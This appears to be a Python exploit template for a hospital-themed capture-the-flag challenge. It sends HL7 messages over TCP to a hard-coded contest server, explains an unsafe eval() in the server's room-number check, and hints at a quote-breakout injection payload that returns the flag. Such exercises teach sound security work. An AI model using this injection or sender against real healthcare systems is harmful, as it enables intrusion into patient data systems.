#!/usr/bin/env python3
"""
HL7 Message Sender - Exploit Template
Modify this to exploit the vulnerable HL7 handler

SaintCon Hospital CTF - Challenge 16: The HL7 Exploit
Target: Elizabeth Hartwell (MRN: VIP-7741, Room 311) 
"""

import socket

def send_hl7_message(host, port, message):
    """Send HL7 message to server"""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(10)
            s.connect((host, port))
            s.sendall(message.encode())
            
            response = s.recv(4096)
            print(f"Server response:\n{response.decode()}\n")
            
    except Exception as e:
        print(f"Error: {e}")

# Sample valid message for Elizabeth Hartwell
# Note: HL7 uses \r (carriage return) as segment separator
valid_message = "MSH|^~\\&|HIS|SAINTCON|LAB|SAINTCON|20251021143000||ADT^A01|MSG00001|P|2.5\r"
valid_message += "PID|1||VIP-7741||HARTWELL^ELIZABETH||19620315|F\r"
valid_message += "PV1|1|I|311^A^01"  

# Test with INVALID room to trigger eval path
test_invalid = "MSH|^~\\&|HIS|SAINTCON|LAB|SAINTCON|20251021143000||ADT^A01|MSG00001|P|2.5\r"
test_invalid += "PID|1||VIP-7741||HARTWELL^ELIZABETH||19620315|F\r"
test_invalid += "PV1|1|I|999^A^01"  # 999 is NOT a valid room, triggers eval

# TODO: Modify the PV1 segment room field to exploit the handler
# 
# VULNERABILITY ANALYSIS:
# The server uses eval() to validate room numbers unsafely:
#     eval(f"'{room}' in {valid_rooms} or '{room}'")
# 
# IMPORTANT: The eval only runs for INVALID room numbers!
# Valid rooms (308-312) skip the eval entirely.  
# 
# EXPLOITATION STEPS:
# 1. Use an invalid room number to trigger the eval path
# 2. Break out of the string context using quotes
# 3. The FLAG variable is available in the eval() scope
# 4. Inject code to make eval() return the FLAG value
#
# HINTS:
# - Valid rooms: 308, 309, 310, 311, 312 (these WON'T trigger eval)  
# - Use an invalid room like: 999, 000, or your exploit
# - Current eval with room "999": eval("'999' in [...] or '999'")
# - What if room was: ' or FLAG or '
# - That would create: eval("'' or FLAG or '' in [...] or ''")
# - The eval would return the FLAG value!
#
# TASK: Replace "999" below with your exploit payload

exploit_message = "MSH|^~\\&|HIS|SAINTCON|LAB|SAINTCON|20251021143000||ADT^A01|MSG00001|P|2.5\r"
exploit_message += "PID|1||VIP-7741||HARTWELL^ELIZABETH||19620315|F\r"
exploit_message += "PV1|1|I|999^A^01"  # <-- MODIFY THIS ROOM NUMBER

if __name__ == "__main__":
    TARGET_HOST = "172.184.215.224"  # SaintCon CTF HL7 Server
    TARGET_PORT = 2575
    
    print("="*70)
    print("SaintCon Hospital - HL7 Exploit Tool")
    print("="*70)
    
    print("\n[*] Test 1: Valid room (311) - No eval triggered")  
    send_hl7_message(TARGET_HOST, TARGET_PORT, valid_message)
    
    print("="*70)
    print("[*] Test 2: Invalid room (999) - Triggers eval")
    print("="*70)
    send_hl7_message(TARGET_HOST, TARGET_PORT, test_invalid)
    
    print("="*70)
    print("[*] Test 3: Your exploit attempt")
    print("="*70)
    send_hl7_message(TARGET_HOST, TARGET_PORT, exploit_message)
    
    print("\n[*] Look for 'EVAL_RESULT:' in the response above")
    print("[*] If you see CTF{...}, you've successfully extracted the flag!")